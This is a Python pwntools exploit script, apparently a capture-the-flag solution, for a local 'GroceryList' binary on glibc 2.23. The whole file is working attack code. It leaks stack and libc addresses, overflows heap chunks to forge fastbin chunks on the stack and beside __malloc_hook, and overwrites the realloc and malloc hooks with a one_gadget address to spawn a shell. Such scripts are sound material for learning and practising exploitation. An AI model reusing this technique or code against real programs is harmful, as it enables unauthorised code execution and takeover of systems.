__author__ = 'Tomer Eyzenberg'

from pwn import *

C_NAME = 'GroceryList'


def trigger_one_gadget(p):
    log.info('triggering one gadget')
    log.info('alloc 1 0x70 chunks')
    p.sendline('3')  # Add empty items
    p.sendline('3')  # Size large 0x70
    p.sendline('1')  # Number of items
    p.interactive()


def overflow_malloc_hooks(p, s, libc_base, one_gadget):
    log.info('overflow realloc & malloc hook')
    log.info('alloc 2 0x70 chunks')
    p.sendline('3')  # Add empty items
    p.sendline('3')  # Size large 0x70
    p.sendline('2')  # Number of items (0,1,3,2,$4$,5,7,8,9)
    log.info('overflow chunk 8')
    p.sendline('5')  # Edit item
    p.sendline('8')  # Index
    """
    <realloc>:	push   r15
    <realloc+2>:	push   r14
    <realloc+4>:	push   r13
    <realloc+6>:	push   r12
    <realloc+8>:	mov    r13,rsi
    <realloc+11>:	push   rbp
    <realloc+12>:	push   rbx          <<< Jump here (fix one gadget constraints, realloc+12)
    <realloc+13>:	mov    rbx,rdi
    <realloc+16>:	sub    rsp,0x38
    """
    p.sendline(cyclic(0xb) + pack(libc_base + one_gadget, word_size=64) + pack(libc_base + s.symbols['realloc'] + 6,
                                                                               word_size=64))


def forge_chunk_in_libc(p, s, libc_base):
    log.info('forge chunk in libc')
    log.info('alloc 3 0x70 chunks')
    p.sendline('3')  # Add empty items
    p.sendline('3')  # Size large 0x70
    p.sendline('3')  # Number of items (0,1,3,2,$4$,5,6,7)
    log.info('free chunk 6')
    p.sendline('4')  # Remove item (0,1,3,2,$4$,5,7)
    p.sendline('6')  # Index
    log.info('overflow chunk 5')
    p.sendline('5')  # Edit item
    p.sendline('5')  # Index
    """
    <__?????????????>   0x0000000000000000  -0x30
    <__?????????????>   0x0000000000000000  -0x28
    <__?????????????>   0x00007fea17326260  -0x20
    <__?????????????>   0x0000000000000000  -0x18
    <__memalign_hook>:	0x00007fea16fe8e20  -0x10
    <__realloc_hook>:	0x0000000000000000  -0x08
    <__malloc_hook>:	0x0000000000000000  -0x00
    """
    p.sendline(
        cyclic(0x68) + pack(0x71, word_size=64) + pack(libc_base + s.symbols['__malloc_hook'] - 0x23, word_size=64))


def leak_libc(p, s):
    log.info('leak libc address')
    log.info('alloc 2 0x20 chunks')
    p.sendline('3')  # Add empty items
    p.sendline('1')  # Size small 0x20
    p.sendline('2')  # Number of items (0,1,3,2,$4$)
    p.sendline('1')  # Print list
    p.recvuntil('----------\n')
    _data = p.recvuntil('7. Exit\n')
    libc_base = unpack(_data.split('4. ')[1].split('\n')[0].strip().ljust(8, '\x00'), word_size=64) - s.symbols[
        '__libc_start_main'] - 240
    log.info('__libc_start_main: ' + hex(s.symbols['__libc_start_main']))
    log.success('libc_base: {libc_base}'.format(libc_base=hex(libc_base)))
    return libc_base


def forge_chunk_in_stack(p, stack_address):
    log.info('forge chunk in stack')
    offset_forged = 0x1b
    stack_forged_chunk = stack_address - offset_forged
    log.info('stack forged chunk: ' + hex(stack_forged_chunk))
    log.info('alloc 3 0x20 chunks')
    p.sendline('3')  # Add empty items
    p.sendline('1')  # Size small 0x20
    p.sendline('3')  # Number of items (0,1,2,3)
    log.info('free chunk 2')
    p.sendline('4')  # Remove item (0,1,3)W
    p.sendline('2')  # Index
    log.info('overflow chunk 1')
    p.sendline('5')  # Edit item
    p.sendline('1')  # Index
    p.sendline(cyclic(0x18) + pack(0x21, word_size=64) + pack(stack_forged_chunk, word_size=64))


def leak_stack_address(p):
    log.info('leak stack address')
    p.sendline('6')  # Add default example (0)
    p.sendline('1')  # Print list
    p.recvuntil('----------\n')
    _data = p.recvline()
    p.recvuntil('7. Exit\n')
    leak_stack = unpack(_data.split('0. ')[1].strip().ljust(8, '\x00'), word_size=64)
    log.success('stack: {leak_stack}'.format(leak_stack=hex(leak_stack)))
    return leak_stack


def find_one_gadget():
    p = process(['one_gadget', './libc.so.6'])
    _data = p.recv()
    log.info('find_one_gadget')
    log.info(_data)
    #    constraints:
    #      [rsp+0x30] == NULL
    gadget = int(re.findall('0x[a-zA-Z0-9]*', _data.split('\n\n')[1])[0], 16)
    log.success('one gadget: {gadget}'.format(gadget=hex(gadget)))
    return 0x4526a  # gadget


def main():
    log.info('init')
    # research/libc-database/libs/libc6_2.23-0ubuntu10_amd64/.debug # contains libc6-dbg (2.23-0ubuntu10)
    p = process(
        ['research/libc-database/libs/libc6_2.23-0ubuntu10_amd64/ld-linux-x86-64.so.2',
         './GroceryList'],
        env={'LD_LIBRARY_PATH': 'research/libc-database/libs/libc6_2.23-0ubuntu10_amd64'})
    gdb.attach(p, '')
    s = ELF('libc.so.6')

    one_gadget = find_one_gadget()
    stack_address = leak_stack_address(p=p)
    forge_chunk_in_stack(p=p, stack_address=stack_address)
    libc_base = leak_libc(p=p, s=s)
    forge_chunk_in_libc(p=p, s=s, libc_base=libc_base)
    overflow_malloc_hooks(p=p, s=s, libc_base=libc_base, one_gadget=one_gadget)
    trigger_one_gadget(p=p)


if __name__ == '__main__':
    main()

